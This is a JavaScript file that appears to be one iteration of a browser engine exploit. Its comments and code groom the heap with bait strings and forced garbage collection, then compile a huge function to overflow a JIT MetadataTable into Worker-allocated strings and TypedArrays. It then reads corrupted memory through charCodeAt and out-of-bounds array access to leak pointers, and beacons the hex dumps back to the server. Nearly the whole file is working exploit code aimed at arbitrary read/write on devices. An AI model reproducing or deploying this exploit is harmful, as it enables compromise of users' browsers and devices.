// p373 - MetadataTable sweep via Worker targets (p146 pattern, improved extraction)
//
// PROVEN on device: p146 showed W-LEN-0-81400 (Worker strings corrupted by sweep).
// Workers allocate MarkedSpace blocks at HIGHER addresses than main thread's
// MetadataTable, so the forward sweep hits them.
//
// p146 approach:
// 1. Main thread: allocate bait buffers (~100KB, same marge slot as MetadataTable)
// 2. Worker: allocate target strings (JSString cells at higher addresses)
// 3. Main thread: free baits + GC -> creates marge holes at low addresses
// 4. Compile 38M function -> MetadataTable fills freed bait hole
// 5. Sweep forward -> hits Worker's JSString cells
// 6. Worker detects .length change and reads charCodeAt for info leak
//
// Improvements over p146:
// - Worker also allocates TypedArrays (for m_length/m_vector corruption -> ARW)
// - Full charCodeAt extraction on header-corrupt strings (p146 skipped these)
// - Sync XHR beacons for reliability
// - Reports hex dump of thunk-derived data
//
// Beacon prefix: V373-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V373-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V373-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  // Worker code: allocates strings + TypedArrays, polls for corruption
  var workerCode = function() {
    var strings = [];
    var views = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var VIEW_LEN = 256;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V373-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {
        try {
          var img = new Image();
          img.src = baseUrl + '/beacon/V373-W-' + tag + '?t=' + Date.now();
        } catch(e2) {}
      }
    }

    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Allocate target strings (large, 100KB each)
        var strCount = e.data.strCount || 14;
        for (var i = 0; i < strCount; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0); // force materialization
          strings.push(s);
        }
        beacon('STRINGS-' + strings.length);

        // Allocate TypedArrays (small, for m_length corruption detection)
        var viewCount = e.data.viewCount || 200;
        for (var i = 0; i < viewCount; i++) {
          try {
            var buf = new ArrayBuffer(VIEW_LEN);
            var v = new Uint8Array(buf);
            for (var j = 0; j < VIEW_LEN; j++) v[j] = 0xBE;
            views.push(v);
          } catch(ex) { break; }
        }
        beacon('VIEWS-' + views.length);

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // Check strings for corruption
        var strHit = 0;
        var strCrash = 0;

        for (var i = 0; i < strings.length; i++) {
          try {
            var len = strings[i].length;
            if (len !== STR_LEN) {
              strHit++;
              beacon('SHIT-' + i + '-len' + len + '-hex' + len.toString(16));

              // Try charCodeAt on the corrupted string
              // m_fiber was corrupted to thunk address
              // Following it as StringImpl: m_data8 at thunk+8
              // charCodeAt reads from wherever m_data8 points
              try {
                var hex = '';
                var readN = Math.min(len > 0 && len < 10000 ? len : 64, 64);
                var readOK = 0;
                for (var j = 0; j < readN; j++) {
                  var cc = strings[i].charCodeAt(j);
                  hex += hexByte(cc & 0xFF);
                  if (cc > 255) hex += hexByte((cc >> 8) & 0xFF);
                  readOK++;
                }
                beacon('SDATA-' + i + '-r' + readOK + '-' + hex.substring(0, 160));
                if (hex.length > 160) beacon('SDAT2-' + i + '-' + hex.substring(160, 320));
              } catch(ex) {
                beacon('SREAD-CRASH-' + i);
              }
            } else {
              // Length OK, check canary chars
              try {
                var c8 = strings[i].charCodeAt(8);
                var c24 = strings[i].charCodeAt(24);
                var c56 = strings[i].charCodeAt(56);
                if (c8 !== CANARY || c24 !== CANARY || c56 !== CANARY) {
                  strHit++;
                  beacon('SCHAR-' + i + '-c8=' + c8 + '-c24=' + c24 + '-c56=' + c56);

                  // Read the corrupted data region
                  var start = -1;
                  for (var s = 0; s < 112; s++) {
                    if (strings[i].charCodeAt(s) !== CANARY) { start = s; break; }
                  }
                  if (start >= 0) {
                    var hex = '';
                    for (var b = start; b < start + 112 && b < STR_LEN; b++) {
                      var v = strings[i].charCodeAt(b);
                      hex += hexByte(v & 0xFF);
                    }
                    beacon('SENTRY-' + i + '-off' + start + '-' + hex.substring(0, 160));

                    // Extract m_slowPathCallDestination at entry+24 (8 bytes)
                    var ptrOff = start + 24;
                    if (ptrOff + 8 <= STR_LEN) {
                      var ptr = '';
                      for (var p = ptrOff; p < ptrOff + 8; p++) {
                        var v = strings[i].charCodeAt(p);
                        ptr += hexByte(v & 0xFF);
                      }
                      beacon('SPTR-' + i + '-' + ptr);
                    }
                  }
                }
              } catch(ex) {}
            }
          } catch(ex) {
            strCrash++;
            beacon('SCRASH-' + i);
          }
        }
        beacon('SRESULT-hit' + strHit + '-crash' + strCrash);

        // Check TypedArrays for corruption
        var viewLenHit = 0;
        var viewDataHit = 0;
        var viewCrash = 0;

        for (var i = 0; i < views.length; i++) {
          try {
            var vLen = views[i].length;
            if (vLen !== VIEW_LEN) {
              viewLenHit++;
              if (viewLenHit <= 3) {
                beacon('VHIT-' + i + '-len' + vLen);

                // If length increased, try OOB read
                if (vLen > VIEW_LEN && vLen < 0x100000) {
                  var hex = '';
                  for (var k = VIEW_LEN; k < Math.min(VIEW_LEN + 64, vLen); k++) {
                    hex += hexByte(views[i][k]);
                  }
                  beacon('VOOB-' + i + '-' + hex.substring(0, 160));
                }
              }
              continue;
            }
            // Check data
            var bad = false;
            for (var j = 0; j < 32; j++) {
              if (views[i][j] !== 0xBE) { bad = true; break; }
            }
            if (bad) {
              viewDataHit++;
              if (viewDataHit <= 3) {
                var hex = '';
                for (var j = 0; j < 32; j++) hex += hexByte(views[i][j]);
                beacon('VDATA-' + i + '-' + hex);
              }
            }
          } catch(ex) {
            viewCrash++;
            if (viewCrash <= 3) beacon('VCRASH-' + i);
          }
        }
        beacon('VRESULT-len' + viewLenHit + '-data' + viewDataHit + '-crash' + viewCrash);

        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // Phase 1: Bait strings (same marge slot size as MetadataTable ~100KB)
  var N_BAIT = 20;
  var BAIT_LEN = 100000;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < BAIT_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, BAIT_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAIT-' + N_BAIT);

  // Phase 2: Worker allocates targets
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
    if (e.data.done) B('WORKER-SCAN-DONE');
  };

  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', strCount: 14, viewCount: 200 });

  // Phase 3: Free baits + GC
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressure() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressure, 30);
      } else {
        B('GC-' + gcRound);
        phaseBuild();
      }
    }
    gcPressure();
  }

  // Phase 4: Compile 38M function
  function phaseBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p373fn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p373ok=true;';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__p373ok ? 'OK' : 'FAIL'));
      if (!window.__p373fn) { B('NO-FN'); return; }

      // Phase 5: Tell Worker to scan for corruption
      B('SCAN-START');
      worker.postMessage({ cmd: 'scan' });
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p373ok) B('TIMEOUT');
    }, 120000);
  }
})();
